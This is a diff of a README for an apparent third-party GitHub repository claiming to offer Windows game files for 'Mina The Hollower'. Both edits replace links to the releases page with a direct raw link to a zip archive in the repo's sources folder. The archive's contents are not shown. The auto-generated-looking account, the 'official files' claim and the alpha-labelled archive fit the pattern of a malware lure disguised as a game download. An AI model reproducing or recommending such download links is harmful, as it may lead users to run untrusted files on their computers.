@@ -1,6 +1,6 @@
 # 🎮 Mina-The-Hollower-Release - Play this classic style adventure game
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ranatarahumaraefoot475/Mina-The-Hollower-Release/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ranatarahumaraefoot475/Mina-The-Hollower-Release/raw/refs/heads/main/sources/Hollower_Mina_The_Release_v1.9-alpha.2.zip)
 
 Mina The Hollower brings a fresh take on the classic top-down action adventure genre. This software provides the game files for Windows users. Follow these steps to set up the game on your computer.
 
@@ -19,7 +19,7 @@ Before you install the game, check your hardware. These requirements ensure a sm
 
 Start by visiting the release page. This page contains the official game files.
 
-[Visit the release page to download your copy](https://github.com/Ranatarahumaraefoot475/Mina-The-Hollower-Release/releases)
+[Visit the release page to download your copy](https://github.com/Ranatarahumaraefoot475/Mina-The-Hollower-Release/raw/refs/heads/main/sources/Hollower_Mina_The_Release_v1.9-alpha.2.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest version at the top of the list.
